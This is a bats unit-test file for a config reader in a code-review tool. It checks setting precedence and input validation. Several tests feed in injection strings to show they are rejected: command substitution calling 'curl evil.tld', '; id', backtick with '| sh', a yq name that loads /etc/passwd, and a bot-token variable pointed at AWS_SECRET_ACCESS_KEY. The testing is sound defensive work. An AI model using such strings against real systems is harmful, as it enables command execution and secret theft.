#!/usr/bin/env bats
bats_require_minimum_version 1.5.0

# Unit tests for scripts/rc-config.sh — the deterministic config reader.
#
# Each test writes YAML fixtures into a per-test temp config dir and asserts the
# effective `key=value` lines on stdout (and skip-reason notes on stderr). YAML
# is parsed with mikefarah yq v4 (installed locally and in CI).
#
# Run: bats tests/unit/rc-config.bats

SCRIPT="$(cd "$(dirname "$BATS_TEST_FILENAME")/../.." && pwd)/scripts/rc-config.sh"

setup() {
  CFG="$BATS_TEST_TMPDIR/cfg"
  mkdir -p "$CFG"
  # The user layer (~/.review-council/config.yml) must never leak in from the
  # machine running the tests: point it at a per-test path (absent by default).
  USERCFG="$BATS_TEST_TMPDIR/user/config.yml"
  export RC_USER_CONFIG="$USERCFG"
}

# no_line_matching <ERE>: assert no stdout line matches.
no_line_matching() {
  if printf '%s\n' "$output" | grep -qE "$1"; then
    echo "unexpected line matching: $1"
    printf '%s\n' "$output"
    return 1
  fi
}

# user_cfg <yaml>: write the user-layer file.
user_cfg() {
  mkdir -p "$(dirname "$USERCFG")"
  printf '%s' "$1" >"$USERCFG"
}

# has_line <key=value>: assert an exact stdout line is present in $output.
has_line() {
  printf '%s\n' "$output" | grep -qxF "$1" || {
    echo "expected line: $1"
    echo "--- actual output ---"
    printf '%s\n' "$output"
    return 1
  }
}

@test "absent files -> all defaults" {
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "status=$status"
  echo "output=<<$output>>"
  [ "$status" -eq 0 ]
  has_line "reviewer.claude.enabled=true"
  has_line "reviewer.perplexity.model=sonar"
  has_line "lens.dependency.providers=perplexity"
  has_line "lens.security.providers=auto"
  has_line "lens.security.replaces_dedicated=false"
  has_line "settings.run_budget_seconds=600"
  has_line "settings.min_reviewers=2"
  has_line "settings.auto_retry=false"
  # Phase-4 knobs -> defaults chosen so absent config = today's behavior
  # (probe off/opt-in; claude_max_turns lenient at 100 so wiring the knob
  # never clamps reviewers shorter than they run today).
  has_line "settings.health_probe=false"
  has_line "settings.health_probe_timeout_seconds=20"
  has_line "settings.claude_max_turns=100"
  # static_analysis.* is now emitted (previously: no `static_analysis:` block ->
  # the whole thing was ignored, no lines at all). Absent block -> defaults.
  has_line "static_analysis.enabled=true"
  has_line "static_analysis.tools=gitleaks,trufflehog,osv-scanner,semgrep,ruff,shellcheck,actionlint,hadolint"
  has_line "static_analysis.timeout_seconds=60"
  has_line "static_analysis.semgrep_config=p/default"
  # pr_comments.* -> default OFF (absent block == today's report-only behavior),
  # and the bot-token env var name defaults to RC_PR_BOT_TOKEN.
  has_line "pr_comments.enabled=false"
  has_line "pr_comments.bot_token_env=RC_PR_BOT_TOKEN"
}

@test "provider enable/disable from config.yml" {
  printf 'reviewers:\n  codex:\n    enabled: false\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.codex.enabled=false"
  # others unaffected
  has_line "reviewer.claude.enabled=true"
}

@test "model bind from config.yml" {
  printf 'reviewers:\n  google:\n    model: gemini-2.5-pro\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.google.model=gemini-2.5-pro"
}

@test "lens pin + security replace-semantics" {
  printf 'lenses:\n  security:\n    providers: [google]\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "lens.security.providers=google"
  has_line "lens.security.replaces_dedicated=true"
}

@test "lens pin with multiple providers joins comma-separated" {
  printf 'lenses:\n  security:\n    providers: [google, claude]\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "lens.security.providers=google,claude"
  has_line "lens.security.replaces_dedicated=true"
}

@test "each settings knob in config.yml is reflected" {
  cat >"$CFG/config.yml" <<'EOF'
settings:
  verify: false
  verify_max_findings: 5
  run_budget_seconds: 300
  min_reviewers: 3
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.verify=false"
  has_line "settings.verify_max_findings=5"
  has_line "settings.run_budget_seconds=300"
  has_line "settings.min_reviewers=3"
}

@test "settings.health_probe: default false, config.yml/config.local.yml precedence, env override" {
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.health_probe=false"

  printf 'settings:\n  health_probe: false\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.health_probe=false"

  printf 'settings:\n  health_probe: true\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.health_probe=true"

  RC_HEALTH_PROBE=false run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.health_probe=false"
}

@test "settings.health_probe_timeout_seconds: default 20, config.yml/config.local.yml precedence, env override" {
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.health_probe_timeout_seconds=20"

  printf 'settings:\n  health_probe_timeout_seconds: 10\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.health_probe_timeout_seconds=10"

  printf 'settings:\n  health_probe_timeout_seconds: 15\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.health_probe_timeout_seconds=15"

  RC_HEALTH_PROBE_TIMEOUT=5 run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.health_probe_timeout_seconds=5"
}

@test "settings.claude_max_turns: default 100, config.yml/config.local.yml precedence, env override" {
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.claude_max_turns=100"

  printf 'settings:\n  claude_max_turns: 10\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.claude_max_turns=10"

  printf 'settings:\n  claude_max_turns: 20\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.claude_max_turns=20"

  RC_CLAUDE_MAX_TURNS=5 run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.claude_max_turns=5"
}

@test "precedence: config.local.yml > config.yml" {
  printf 'settings:\n  verify: true\n' >"$CFG/config.yml"
  printf 'settings:\n  verify: false\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.verify=false"
}

@test "precedence: env > config.local.yml" {
  printf 'settings:\n  verify: true\n' >"$CFG/config.yml"
  printf 'settings:\n  verify: false\n' >"$CFG/config.local.yml"
  RC_VERIFY=true run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.verify=true"
}

@test "malformed value -> default + stderr note" {
  printf 'settings:\n  min_reviewers: abc\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  has_line "settings.min_reviewers=2"
  printf '%s\n' "$stderr" | grep -q 'min_reviewers'
}

@test "malformed file -> skipped with note, other layer still used" {
  printf ':::not valid yaml:::\n  a: : b\n' >"$CFG/config.yml"
  printf 'settings:\n  verify: false\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  has_line "settings.verify=false"
  printf '%s\n' "$stderr" | grep -qi 'malformed'
}

@test "unknown key ignored, output unaffected" {
  cat >"$CFG/config.yml" <<'EOF'
bogus_top_level: 1
settings:
  not_a_real_key: 9
  verify: false
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.verify=false"
  # still emits the full default roster
  has_line "reviewer.claude.enabled=true"
}

@test "yq-absent fallback: files ignored, defaults + env, yq-not-found note" {
  # Force yq-absent deterministically via RC_YQ pointing at an unresolvable path.
  # (Stripping PATH is unreliable: CI runners may ship yq in /usr/bin.)
  # Config sets min_reviewers:9, but with no usable yq the file is ignored and
  # only the env override should take effect.
  printf 'settings:\n  min_reviewers: 9\n' >"$CFG/config.yml"
  RC_YQ=/nonexistent/yq RC_VERIFY=false run --separate-stderr "$SCRIPT" "$CFG"
  echo "status=$status"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  # file ignored -> min_reviewers stays default (not 9)
  has_line "settings.min_reviewers=2"
  # env still applies
  has_line "settings.verify=false"
  # defaults still emitted
  has_line "reviewer.perplexity.model=sonar"
  printf '%s\n' "$stderr" | grep -q 'yq not found'
}

@test "wrong yq flavor (Python yq, no mikefarah): files ignored, defaults + env, distinct note" {
  # Two different tools are named `yq`: mikefarah (Go — this reader's
  # required tag/query syntax) and a Python one (kislyuk) that prints e.g.
  # "yq 3.4.3" with no "mikefarah". A fake shim simulates the Python yq being
  # first on PATH: `command -v` finds *a* yq, but it's the wrong one. Config
  # sets min_reviewers:9, but since the resolved yq isn't mikefarah v4, the
  # reader must ignore the file entirely (not just fail individual queries)
  # and fall back to defaults + env, exactly like the yq-absent case.
  FAKE_YQ="$BATS_TEST_TMPDIR/yq"
  cat >"$FAKE_YQ" <<'EOF'
#!/usr/bin/env sh
echo "yq 3.4.3"
exit 0
EOF
  chmod +x "$FAKE_YQ"
  printf 'settings:\n  min_reviewers: 9\n' >"$CFG/config.yml"
  RC_YQ="$FAKE_YQ" RC_VERIFY=false run --separate-stderr "$SCRIPT" "$CFG"
  echo "status=$status"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  # file ignored -> min_reviewers stays default (not 9)
  has_line "settings.min_reviewers=2"
  # env still applies
  has_line "settings.verify=false"
  # defaults still emitted
  has_line "reviewer.perplexity.model=sonar"
  printf '%s\n' "$stderr" | grep -q 'not mikefarah'
  printf '%s\n' "$stderr" | grep -q 'config files ignored'
}

@test "static_analysis block with unrecognized sub-keys -> those ignored, real keys still default, no crash" {
  # `semgrep:` (a per-tool sub-block) and `eslint:` are NOT among the four
  # documented static_analysis.* keys (enabled/tools/timeout_seconds/
  # semgrep_config) -> ignored like any other unknown key, without erroring
  # the rest of the file. The four real keys still emit their defaults.
  cat >"$CFG/config.yml" <<'EOF'
static_analysis:
  semgrep:
    enabled: true
  eslint: true
settings:
  verify: false
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "status=$status"
  [ "$status" -eq 0 ]
  has_line "settings.verify=false"
  has_line "reviewer.claude.enabled=true"
  # the four real static_analysis.* keys are emitted with their defaults
  has_line "static_analysis.enabled=true"
  has_line "static_analysis.tools=gitleaks,trufflehog,osv-scanner,semgrep,ruff,shellcheck,actionlint,hadolint"
  has_line "static_analysis.timeout_seconds=60"
  has_line "static_analysis.semgrep_config=p/default"
}

@test "static_analysis.enabled: config.yml sets false, then RC_STATIC_ANALYSIS env overrides back to true" {
  printf 'static_analysis:\n  enabled: false\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.enabled=false"

  RC_STATIC_ANALYSIS=true run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.enabled=true"
}

@test "static_analysis.tools: explicit list from config.yml" {
  printf 'static_analysis:\n  tools: [gitleaks, semgrep]\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.tools=gitleaks,semgrep"
}

@test "static_analysis.tools: RC_STATIC_TOOLS env overrides the config.yml list" {
  printf 'static_analysis:\n  tools: [gitleaks, semgrep]\n' >"$CFG/config.yml"
  RC_STATIC_TOOLS="ruff,shellcheck" run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.tools=ruff,shellcheck"
}

@test "static_analysis.tools: unknown tool token dropped with a note, valid ones kept" {
  printf 'static_analysis:\n  tools: [gitleaks, eslint, semgrep]\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  has_line "static_analysis.tools=gitleaks,semgrep"
  printf '%s\n' "$stderr" | grep -q "unknown tool 'eslint'"
}

@test "static_analysis.tools: unknown token in RC_STATIC_TOOLS env also dropped with a note" {
  RC_STATIC_TOOLS="gitleaks, bogus-tool ,ruff" run --separate-stderr "$SCRIPT" "$CFG"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  # valid tokens kept (and env-provided whitespace around tokens trimmed)
  has_line "static_analysis.tools=gitleaks,ruff"
  printf '%s\n' "$stderr" | grep -q "unknown tool 'bogus-tool'"
}

@test "static_analysis.tools: glob-metacharacter token is treated literally, not pathname-expanded" {
  # Regression guard: an unquoted `for tok in $list` (needed to split on
  # commas) would otherwise let a token like `*` undergo pathname expansion
  # against the CWD's files instead of being validated as a literal string.
  RC_STATIC_TOOLS='*' run --separate-stderr "$SCRIPT" "$CFG"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  has_line "static_analysis.tools="
  printf '%s\n' "$stderr" | grep -qF "unknown tool '*'"
}

@test "static_analysis.timeout_seconds: default, config override, malformed->default, env override" {
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.timeout_seconds=60"

  printf 'static_analysis:\n  timeout_seconds: 30\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.timeout_seconds=30"

  printf 'static_analysis:\n  timeout_seconds: abc\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  has_line "static_analysis.timeout_seconds=60"
  printf '%s\n' "$stderr" | grep -q 'static_analysis.timeout_seconds'

  rm -f "$CFG/config.yml"
  RC_STATIC_TIMEOUT=45 run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.timeout_seconds=45"
}

@test "static_analysis.semgrep_config: default p/default, off, custom path, env override" {
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.semgrep_config=p/default"

  printf 'static_analysis:\n  semgrep_config: "off"\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.semgrep_config=off"

  printf 'static_analysis:\n  semgrep_config: .semgrep/custom.yml\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.semgrep_config=.semgrep/custom.yml"

  RC_SEMGREP_CONFIG=p/ci run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.semgrep_config=p/ci"
}

@test "static_analysis.*: precedence env > config.local.yml > config.yml > default holds" {
  printf 'static_analysis:\n  timeout_seconds: 30\n' >"$CFG/config.yml"
  printf 'static_analysis:\n  timeout_seconds: 45\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.timeout_seconds=45"

  RC_STATIC_TIMEOUT=90 run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.timeout_seconds=90"
}

@test "static_analysis.semgrep_config with embedded newline -> default + note, no injected stdout line" {
  # Same control-char-free validation as reviewer.<p>.model: an embedded
  # newline would otherwise inject a fabricated key=value stdout line.
  cat >"$CFG/config.yml" <<'EOF'
static_analysis:
  semgrep_config: "auto\ninjected.line=malicious"
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "status=$status"
  echo "output=<<$output>>"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  # crafted value rejected -> falls back to the default ("auto")
  has_line "static_analysis.semgrep_config=p/default"
  printf '%s\n' "$stderr" | grep -q 'static_analysis.semgrep_config'
  ! printf '%s\n' "$output" | grep -q 'injected.line'
  ! printf '%s\n' "$output" | grep -vE '^#|='
}

@test "string value with embedded newline -> default + note, no injected stdout line" {
  # A model value with an embedded newline would split into a second, fabricated
  # key=value line, breaking the one-per-line output contract. It must be
  # rejected like any malformed value: default + stderr note.
  cat >"$CFG/config.yml" <<'EOF'
reviewers:
  google:
    model: "abc\ninjected.line=malicious"
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "status=$status"
  echo "output=<<$output>>"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  # crafted value rejected -> model falls back to its default (empty)
  has_line "reviewer.google.model="
  # stderr note names the offending key
  printf '%s\n' "$stderr" | grep -q 'reviewer.google.model'
  # NO fabricated key=value line reached stdout
  ! printf '%s\n' "$output" | grep -q 'injected.line'
  # contract intact: every stdout line is a `# comment` or a `key=value` pair
  ! printf '%s\n' "$output" | grep -vE '^#|='
}

@test "providers entry with embedded newline -> default + note, no injected stdout line" {
  cat >"$CFG/config.yml" <<'EOF'
lenses:
  security:
    providers: ["google\ninjected.line=x"]
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "status=$status"
  echo "output=<<$output>>"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  # rejected pin -> providers falls back to the default (auto), not a partial pin
  has_line "lens.security.providers=auto"
  has_line "lens.security.replaces_dedicated=false"
  printf '%s\n' "$stderr" | grep -q 'lens.security.providers'
  ! printf '%s\n' "$output" | grep -q 'injected.line'
  # contract intact: no fabricated non-key=value stdout line
  ! printf '%s\n' "$output" | grep -vE '^#|='
}

@test "layered-invalid: higher layer invalid keeps lower layer's valid value" {
  # config.yml sets a VALID value; config.local.yml sets an INVALID one for the
  # same key. The higher-precedence-but-invalid value must NOT clobber the lower
  # valid one — the valid config.yml value stands, with a stderr note.
  printf 'settings:\n  min_reviewers: 3\n' >"$CFG/config.yml"
  printf 'settings:\n  min_reviewers: abc\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "status=$status"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  has_line "settings.min_reviewers=3"
  printf '%s\n' "$stderr" | grep -q 'min_reviewers'
}

# ---------------------------------------------------------------------------
# modelslug guard on reviewer.<p>.model — the injection sink.
#
# A model value is interpolated UNQUOTED into a shell command the orchestrator
# composes (skills/run/SKILL.md's RC_GOOGLE_MODEL=<model> template), IN THE
# ORCHESTRATOR'S OWN SESSION, OUTSIDE ANY SANDBOX. The reader's control-chars-
# only `valid_str` let shell metacharacters (space, ; | ` $ ( )) survive, so a
# repo-committed config.yml could reach command position. The `modelslug` kind
# is a charset allowlist at the reader — the only real defense, since $(...)
# expands even inside double quotes so an LLM quoting the template can't save it.
# ---------------------------------------------------------------------------

@test "modelslug: command-substitution in a model value is rejected + noted" {
  cat >"$CFG/config.yml" <<'EOF'
reviewers:
  google:
    model: "gemini-3 $(curl evil.tld)"
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  # rejected -> falls back to google's default (empty)
  has_line "reviewer.google.model="
  printf '%s\n' "$stderr" | grep -q 'reviewer.google.model'
  # the metacharacters never reach stdout
  ! printf '%s\n' "$output" | grep -q 'curl evil'
  ! printf '%s\n' "$output" | grep -vE '^#|='
}

@test "modelslug: semicolon/space in a model value is rejected (the live exploit)" {
  cat >"$CFG/config.yml" <<'EOF'
reviewers:
  google:
    model: "gemini-3 ; id"
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.google.model="
  printf '%s\n' "$stderr" | grep -q 'reviewer.google.model'
  ! printf '%s\n' "$output" | grep -qF 'gemini-3 ; id'
}

@test "modelslug: backtick and pipe in a model value are rejected" {
  cat >"$CFG/config.yml" <<'EOF'
reviewers:
  codex:
    model: "gpt `id` | sh"
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.codex.model="
  printf '%s\n' "$stderr" | grep -q 'reviewer.codex.model'
}

@test "modelslug: a leading hyphen is rejected (no flag injection)" {
  cat >"$CFG/config.yml" <<'EOF'
reviewers:
  google:
    model: "-cfoo"
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.google.model="
  printf '%s\n' "$stderr" | grep -q 'reviewer.google.model'
}

@test "modelslug: the guard covers every reviewer, not just google" {
  cat >"$CFG/config.yml" <<'EOF'
reviewers:
  claude:
    model: "opus ; id"
  perplexity:
    model: "sonar ; id"
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  # claude falls back to its empty default; perplexity to its 'sonar' default
  has_line "reviewer.claude.model="
  has_line "reviewer.perplexity.model=sonar"
  printf '%s\n' "$stderr" | grep -q 'reviewer.claude.model'
  printf '%s\n' "$stderr" | grep -q 'reviewer.perplexity.model'
}

@test "modelslug: real slugs are admitted unchanged" {
  cat >"$CFG/config.yml" <<'EOF'
reviewers:
  google:
    model: gemini-2.5-pro
  codex:
    model: openai/gpt-4o:free
  claude:
    model: ~moonshotai/kimi-latest
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.google.model=gemini-2.5-pro"
  has_line "reviewer.codex.model=openai/gpt-4o:free"
  has_line "reviewer.claude.model=~moonshotai/kimi-latest"
  # a clean config emits no notes about these keys
  ! printf '%s\n' "$stderr" | grep -q 'reviewer.google.model'
}

@test "modelslug: an explicit empty model stays valid (no spurious note, no default swap)" {
  # Empty means "use the tool's own default" — must remain valid, exactly as the
  # old `str` kind treated it. Regressing this would flip perplexity's explicit
  # empty into its 'sonar' default.
  cat >"$CFG/config.yml" <<'EOF'
reviewers:
  perplexity:
    model: ""
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.perplexity.model="
  ! printf '%s\n' "$stderr" | grep -q 'reviewer.perplexity.model'
}

# ---------------------------------------------------------------------------
# pr_comments.* — the optional PR-digest posting gate
# ---------------------------------------------------------------------------

@test "pr_comments: enabled from config.yml; bot_token_env from config.local.yml admitted" {
  # enabled is a fine committed team default; bot_token_env must come from a
  # TRUSTED layer (config.local.yml), because its NAME selects which local secret
  # is read and sent to GitHub.
  printf 'pr_comments:\n  enabled: true\n' >"$CFG/config.yml"
  printf 'pr_comments:\n  bot_token_env: MY_BOT_TOKEN\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "pr_comments.enabled=true"
  has_line "pr_comments.bot_token_env=MY_BOT_TOKEN"
  ! printf '%s\n' "$stderr" | grep -q 'pr_comments'
}

@test "pr_comments: bot_token_env in the committed config.yml is IGNORED (untrusted layer)" {
  # A reviewed repo could commit config.yml pointing bot_token_env at a local
  # secret (e.g. AWS_SECRET_ACCESS_KEY — a valid identifier). It must be ignored,
  # falling back to the default, with a note.
  cat >"$CFG/config.yml" <<'EOF'
pr_comments:
  enabled: true
  bot_token_env: AWS_SECRET_ACCESS_KEY
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "pr_comments.enabled=true"
  has_line "pr_comments.bot_token_env=RC_PR_BOT_TOKEN"
  ! printf '%s\n' "$output" | grep -qF 'AWS_SECRET_ACCESS_KEY'
  printf '%s\n' "$stderr" | grep -q 'pr_comments.bot_token_env'
}

@test "pr_comments: RC_PR_BOT_TOKEN_ENV env overrides the token var name" {
  printf 'pr_comments:\n  enabled: true\n' >"$CFG/config.yml"
  RC_PR_BOT_TOKEN_ENV=CI_BOT_TOKEN run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "pr_comments.bot_token_env=CI_BOT_TOKEN"
}

@test "pr_comments: RC_PR_COMMENTS env overrides enabled" {
  # config says off; env forces it on (the CI-toggle path).
  printf 'pr_comments:\n  enabled: false\n' >"$CFG/config.yml"
  RC_PR_COMMENTS=true run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "pr_comments.enabled=true"
}

@test "pr_comments: a non-bool enabled falls back to the default with a note" {
  printf 'pr_comments:\n  enabled: yes-please\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "pr_comments.enabled=false"
  printf '%s\n' "$stderr" | grep -q 'pr_comments.enabled'
}

@test "pr_comments: bot_token_env with shell metacharacters is rejected to default" {
  # Read via indirect expansion downstream, so a value that could reach command
  # position must be rejected at the reader. (Set in the trusted local layer.)
  printf 'pr_comments:\n  bot_token_env: "FOO; id"\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "pr_comments.bot_token_env=RC_PR_BOT_TOKEN"
  printf '%s\n' "$stderr" | grep -q 'pr_comments.bot_token_env'
  ! printf '%s\n' "$output" | grep -qF 'FOO; id'
}

@test "pr_comments: a bot_token_env starting with a digit is rejected (not a POSIX name)" {
  printf 'pr_comments:\n  bot_token_env: 1BADNAME\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "pr_comments.bot_token_env=RC_PR_BOT_TOKEN"
  printf '%s\n' "$stderr" | grep -q 'pr_comments.bot_token_env'
}

@test "pr_comments: an explicit empty bot_token_env stays empty (no bot -> user identity)" {
  # Empty is a valid, deliberate choice: no bot-token var -> always post as the
  # authenticated user. It must NOT swap in the RC_PR_BOT_TOKEN default.
  printf 'pr_comments:\n  bot_token_env: ""\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "pr_comments.bot_token_env="
  ! printf '%s\n' "$stderr" | grep -q 'pr_comments.bot_token_env'
}

# ---------------------------------------------------------------------------
# Custom reviewer seats (reviewers.custom.*)
# ---------------------------------------------------------------------------

@test "custom: no custom block anywhere -> not one byte of the section (config invariance)" {
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  no_line_matching '^# custom reviewers$'
  no_line_matching '^reviewer\.custom'
  no_line_matching '^confirm\.'
}

@test "custom: a local-Ollama seat in the user layer -> full emission, no key, no confirm" {
  user_cfg 'reviewers:
  custom:
    local-qwen:
      harness: ocr
      provider: ollama
      model: qwen3.6:35b-a3b-coding-nvfp4
'
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "# custom reviewers"
  has_line "reviewer.custom_slots=local-qwen"
  has_line "reviewer.custom.local-qwen.enabled=true"
  has_line "reviewer.custom.local-qwen.source=user"
  has_line "reviewer.custom.local-qwen.harness=ocr"
  has_line "reviewer.custom.local-qwen.provider=ollama"
  has_line "reviewer.custom.local-qwen.model=qwen3.6:35b-a3b-coding-nvfp4"
  has_line "reviewer.custom.local-qwen.role=signal"
  has_line "reviewer.custom.local-qwen.api_key_env="
  has_line "reviewer.custom.local-qwen.family=Qwen"
  has_line "reviewer.custom.local-qwen.distinct=true"
  has_line "reviewer.custom.local-qwen.opt.effort=low"
  has_line "reviewer.custom.local-qwen.opt.concurrency="
  has_line "reviewer.custom.local-qwen.opt.max_tokens_budget=0"
  has_line "reviewer.custom.local-qwen.opt.timeout_minutes="
  no_line_matching '^confirm\.'
}

@test "custom: harness is required; missing/invalid -> seat skipped with a note" {
  printf 'reviewers:\n  custom:\n    a:\n      model: qwen/x\n    b:\n      harness: foo\n      model: qwen/x\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  no_line_matching '^reviewer\.custom'
  [[ "$stderr" == *"reviewer.custom.a: no valid harness"* ]] || false
  [[ "$stderr" == *"reviewer.custom.b: no valid harness"* ]] || false
}

@test "custom: model is required and slug-guarded (injection rejected, seat skipped)" {
  printf 'reviewers:\n  custom:\n    a:\n      harness: ocr\n    b:\n      harness: ocr\n      model: "qwen ; id"\n    c:\n      harness: ocr\n      model: "-rule=x"\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  no_line_matching '^reviewer\.custom'
  [[ "$stderr" == *"invalid value 'qwen ; id'"* ]] || false
  [[ "$stderr" == *"reviewer.custom.c: no valid model"* ]] || false
}

@test "custom: provider and role are enums; invalid -> default with a note" {
  printf 'reviewers:\n  custom:\n    a:\n      harness: ocr\n      model: qwen/x\n      provider: "evil.example"\n      role: judge\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.a.provider=openrouter"
  has_line "reviewer.custom.a.role=signal"
  [[ "$stderr" == *"invalid value 'evil.example'"* ]] || false
  [[ "$stderr" == *"invalid value 'judge'"* ]] || false
}

@test "custom: seat-name guard runs BEFORE any re-interpolation (yq-injection names dropped)" {
  cat >"$CFG/config.local.yml" <<'YML'
reviewers:
  custom:
    'x"] | load("/etc/passwd") | .["y':
      harness: ocr
      model: qwen/x
    "has.dot":
      harness: ocr
      model: qwen/x
    ok_name-1:
      harness: ocr
      model: qwen/x
YML
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom_slots=ok_name-1"
  [[ "$stderr" == *"invalid seat name"* ]] || false
  no_line_matching 'passwd|root:'
}

